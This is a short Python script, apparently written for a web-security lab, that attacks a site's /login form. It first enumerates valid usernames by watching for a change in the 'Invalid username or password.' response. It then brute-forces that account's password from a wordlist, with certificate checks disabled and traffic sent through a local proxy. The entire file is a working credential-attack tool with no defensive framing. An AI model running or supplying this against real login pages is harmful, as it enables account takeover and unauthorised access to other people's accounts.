import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def load_wordlist(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print('(+) Error : THe file %s was not found' % filepath)
        sys.exit(-1)

def username_enumeration_attack(s, url, usernames):
    login_url = url + '/login'
    
    for user in usernames:
        login_data = { 'username' : user, 'password' : 'test' }
        r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
        res = r.text
        if "Invalid username or password." not in res:
            return user
            

def password_bruteforce_attack(s, url, usernames, passwords):
    login_url = url + '/login'

    for password in passwords:
            login_data = { 'username' : usernames, 'password' : password }
            r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
            res = r.text
            if "Log out" in res:
                print('(+) Account login sucessful!')
                print('(+) Exploitation Sucessful!')


def main():
    if len(sys.argv) !=2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    usernames = load_wordlist('usernames.txt')
    passwords = load_wordlist('passwords.txt')

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    username = username_enumeration_attack(s, url, usernames)
    password = password_bruteforce_attack(s, url, username, passwords)

if __name__ == "__main__":
    main()